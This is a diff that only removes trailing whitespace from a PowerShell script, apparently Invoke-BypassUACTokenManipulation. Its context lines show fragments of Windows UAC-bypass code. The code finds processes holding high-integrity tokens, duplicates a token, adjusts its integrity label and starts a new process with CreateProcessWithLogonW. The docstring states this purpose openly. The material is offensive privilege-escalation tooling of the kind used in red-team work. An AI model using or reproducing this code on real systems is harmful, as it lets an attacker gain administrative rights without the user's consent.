@@ -9,7 +9,7 @@ Author: Matthew Graeber (@mattifestation)
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
- 
+
 .DESCRIPTION
 
 When defining custom enums, structs, and unmanaged functions, it is
@@ -329,7 +329,7 @@ function psenum
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
-     
+
     .DESCRIPTION
 
         The 'psenum' function facilitates the creation of enums entirely in
@@ -442,15 +442,15 @@ function field
         [Parameter(Position = 0, Mandatory = $True)]
         [UInt16]
         $Position,
-        
+
         [Parameter(Position = 1, Mandatory = $True)]
         [Type]
         $Type,
-        
+
         [Parameter(Position = 2)]
         [UInt16]
         $Offset,
-        
+
         [Object[]]
         $MarshalAs
     )
@@ -474,7 +474,7 @@ Author: Matthew Graeber (@mattifestation)
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: field
- 
+
 .DESCRIPTION
 
 The 'struct' function facilitates the creation of structs entirely in
@@ -663,7 +663,7 @@ New-Struct. :P
             {
                 $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
             }
-            
+
             $NewField.SetCustomAttribute($AttribBuilder)
         }
 
@@ -813,7 +813,7 @@ $FunctionDefinitions = @(
         [UInt32],
         [UInt32],
         [UInt32],
-        [IntPtr].MakeByRefType()                  
+        [IntPtr].MakeByRefType()
     ) -EntryPoint AllocateAndInitializeSid -SetLastError),
 
     (func advapi32 ImpersonateLoggedOnUser ([bool]) @(
@@ -887,16 +887,16 @@ function EnumProcesses(){
         $CallResult = $Advapi32::OpenProcessToken($ProcHandle, 0x02000000, [ref]$hTokenHandle)
         if($CallResult -eq 0){
             return
-        }   
-            
+        }
+
         # Call GetTokenInformation with TokenInformationClass = 25 (TokenIntegrityLevel)
         [int]$Length = 0
         $CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, [IntPtr]::Zero, $Length, [ref]$Length)
-            
+
         # After we get the buffer length alloc and call again
         [IntPtr]$TokenInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Length)
         $CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, $TokenInformation, $Length, [ref]$Length)
-            
+
         [System.IntPtr] $pSid1 = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($TokenInformation)
         [int]$IntegrityLevel = [System.Runtime.InteropServices.Marshal]::ReadInt32($advapi32::GetSidSubAuthority($pSid1, ([System.Runtime.InteropServices.Marshal]::ReadByte($Advapi32::GetSidSubAuthorityCount($pSid1)) - 1)))
         if($IntegrityLevel -eq 12288){
@@ -908,7 +908,7 @@ function EnumProcesses(){
 function ElevateProcess($HIProc,$Binary, $Arguments){
     $PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
     $bInheritHandle = $false
-    $hProcess = $Kernel32::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION, $bInheritHandle, $HIProc[0]) 
+    $hProcess = $Kernel32::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION, $bInheritHandle, $HIProc[0])
     if ($hProcess -ne 0) {
             Write-Verbose "[*] Successfully acquired $((Get-Process -Id $HIProc).Name) handle"
         } else {
@@ -916,7 +916,7 @@ function ElevateProcess($HIProc,$Binary, $Arguments){
             Break
         }
     $hToken = [IntPtr]::Zero
-    
+
     if($Advapi32::OpenProcessToken($hProcess, 0x02000000, [ref]$hToken)) {
         Write-Verbose "[*] Opened process token"
     } else {
@@ -925,7 +925,7 @@ function ElevateProcess($HIProc,$Binary, $Arguments){
     }
 
 
-    $hNewToken = [IntPtr]::Zero 
+    $hNewToken = [IntPtr]::Zero
     $SEC_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
     [IntPtr]$SEC_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
     [Runtime.InteropServices.Marshal]::StructureToPtr($SEC_ATTRIBUTES_Struct, $SEC_ATTRIBUTES_PTR,$False)
@@ -936,7 +936,7 @@ function ElevateProcess($HIProc,$Binary, $Arguments){
         Break
     }
     $SIA_Struct = [Activator]::CreateInstance($SID_IDENTIFIER_AUTHORITY)
-    #0x10 == SECURITY_MANDATORY_LABEL_AUTHORITY  
+    #0x10 == SECURITY_MANDATORY_LABEL_AUTHORITY
     $SIA_Struct.Value = [byte[]](0x0, 0x0, 0x0, 0x0, 0x0, 0x10)
 
     [IntPtr]$SIA_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_IDENTIFIER_AUTHORITY::GetSize())
@@ -989,7 +989,7 @@ function ElevateProcess($HIProc,$Binary, $Arguments){
     }
 
     $STARTUP_INFO_STRUCT = [Activator]::CreateInstance($STARTUPINFO)
-    $STARTUP_INFO_STRUCT.dwFlags = 0x00000001 
+    $STARTUP_INFO_STRUCT.dwFlags = 0x00000001
     $STARTUP_INFO_STRUCT.wShowWindow = 0x0001
     $STARTUP_INFO_STRUCT.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($STARTUP_INFO_STRUCT)
     [IntPtr]$STARTUP_INFO_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO::GetSize())
@@ -1006,7 +1006,7 @@ function ElevateProcess($HIProc,$Binary, $Arguments){
 function Invoke-BypassUACTokenManipulation {
 <#
     .SYNOPSIS
-        Bypasses UAC by Duplicating a HI security access token and calling CreateProcessWithLogonW() 
+        Bypasses UAC by Duplicating a HI security access token and calling CreateProcessWithLogonW()
         Author: Matt Nelson (@enigma0x3), James Forshaw (@tiraniddo) and Ruben Boonen (@fuzzySec)
         License: BSD 3-Clause
         Required Dependencies: None
@@ -1014,8 +1014,8 @@ function Invoke-BypassUACTokenManipulation {
     .DESCRIPTION
        This function will enumerate the process listing for any processes that have a HI security access token.
        If one is identified, it will Duplicate that token, apply it to the current thread and then call
-       CreateProcessWithLogonW() to start a new process with that HI security access token. If a HI token is not 
-       found, the function will start one via the "RunAs" verb for TaskMgr.exe, loop the process list again and 
+       CreateProcessWithLogonW() to start a new process with that HI security access token. If a HI token is not
+       found, the function will start one via the "RunAs" verb for TaskMgr.exe, loop the process list again and
        Duplicate any newly found HI security access tokens.
 
     .PARAMETER Binary
@@ -1085,6 +1085,6 @@ param(
         Write-Verbose "Elevating $ProcID"
         ElevateProcess $ProcID $Binary $Arguments
     }
-    
-    
+
+
 }
